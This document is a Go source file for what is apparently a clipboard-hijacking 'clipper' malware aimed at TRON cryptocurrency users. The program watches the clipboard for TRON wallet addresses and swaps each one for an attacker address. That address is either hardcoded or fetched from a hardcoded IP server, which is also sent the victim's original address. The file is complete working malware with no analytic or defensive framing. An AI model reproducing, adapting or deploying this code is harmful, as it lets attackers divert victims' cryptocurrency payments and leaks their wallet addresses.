package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/fbsobreira/gotron-sdk/pkg/address"
)

var (
	DefaultAddress = "THfNDb5qcuWCyQk7bA1Cdb4HcoVW4k8Nuj"
	Enable         = false
)

type ResponseAddress struct {
	Address string `json:"address"`
}

func main() {
	var lastContent string
	for {
		content, err := clipboard.ReadAll()
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		if content == "" || content == lastContent {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		if strings.HasPrefix(content, "T") {
			regex := regexp.MustCompile(`^(T[1-9A-HJ-NP-Za-km-z]{33})$`)
			matches := regex.FindStringSubmatch(content)
			if len(matches) > 1 {
				tronAddress := matches[1]
				if IsTronAddress(tronAddress) {
					if Enable {
						_ = clipboard.WriteAll(DefaultAddress)
					} else {
						newAddress := GetAddress(tronAddress)
						if newAddress != "" {
							_ = clipboard.WriteAll(newAddress)
						}
					}
				}
			}
		}
		lastContent = content
		time.Sleep(1 * time.Second)
	}
}

func IsTronAddress(useraddress string) bool {
	_, err := address.Base58ToAddress(useraddress)
	return err == nil
}

func GetAddress(addr string) string {
	url := "http://166.88.55.216:7777/v1/getadress?address=" + addr
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return DefaultAddress
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return DefaultAddress
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return DefaultAddress
	}
	var responseAddress ResponseAddress
	err = json.Unmarshal(body, &responseAddress)
	if err != nil {
		return DefaultAddress
	}
	if responseAddress.Address == "" {
		return DefaultAddress
	}
	return responseAddress.Address
}